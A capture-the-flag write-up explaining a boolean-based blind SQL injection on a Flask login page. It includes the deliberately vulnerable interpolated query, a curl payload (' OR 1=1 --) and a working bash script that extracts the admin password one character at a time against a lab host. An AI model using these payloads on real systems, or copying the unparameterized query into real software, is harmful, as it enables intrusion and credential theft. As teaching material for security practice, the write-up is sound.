# SQLi5

## Challenge Description

This level is a blind SQL injection. The application does not return query results, but it behaves differently based on whether the login succeeds. We can use that yes/no signal to extract the flag one character at a time.

## Source Code Analysis

Relevant code:

```python
query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
user = db.execute(query).fetchone()

if not user:
    flask.abort(403, "Invalid username or password")

return flask.redirect(flask.request.path)
```

The query is vulnerable to SQL injection because user input is directly interpolated into the SQL string. The response is:

- 302 redirect if the query returns a row (condition true)
- 403 if no row is returned (condition false)

That gives a reliable boolean oracle.

## Vulnerability

The `password` field is injectable. Even though results are not shown, we can ask yes/no questions by making the login succeed or fail depending on a boolean expression.

## Exploitation (Boolean-Based Blind SQLi)

### Step 1: Confirm the boolean channel

```bash
curl -i -s -X POST http://challenge.localhost/ \
  -d "username=admin" \
  -d "password=' OR 1=1 --"
```

If the response is `302 FOUND`, the injected condition is true.

### Step 2: Extract the flag with boolean checks

Use the response code to test each character. SQLite provides `substr()` and `unicode()` so we can compare a character by its ASCII code. For each position `i`, perform a binary search over printable characters:

```bash
#!/usr/bin/env bash
set -euo pipefail

url="http://challenge.localhost/"
user="admin"

# Find flag length
len=0
for L in $(seq 1 128); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
    -d "username=$user" \
    -d "password=' OR (SELECT length(password) FROM users WHERE username='admin')=$L --")
  if [ "$code" = "302" ]; then
    len=$L
    break
  fi
done
echo "length=$len"

# Binary search each character
result=""
for i in $(seq 1 "$len"); do
  low=32
  high=126
  while [ $low -le $high ]; do
    mid=$(( (low + high) / 2 ))
    code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
      -d "username=$user" \
      -d "password=' OR (SELECT unicode(substr(password,$i,1)) FROM users WHERE username='admin')>$mid --")
    if [ "$code" = "302" ]; then
      low=$((mid + 1))
    else
      high=$((mid - 1))
    fi
  done
  ch=$(printf "\\$(printf '%03o' "$low")")
  result+="$ch"
  printf "%s" "$ch"
done
echo
```

This recovers the admin password (the flag) without ever seeing query output, using only the success/failure behavior.

## Why This Works

- The input is concatenated into the SQL query without parameterization.
- A successful login returns a 302 redirect; failure returns 403.
- By testing boolean conditions, we turn the login response into a bit-by-bit oracle and reconstruct the secret.
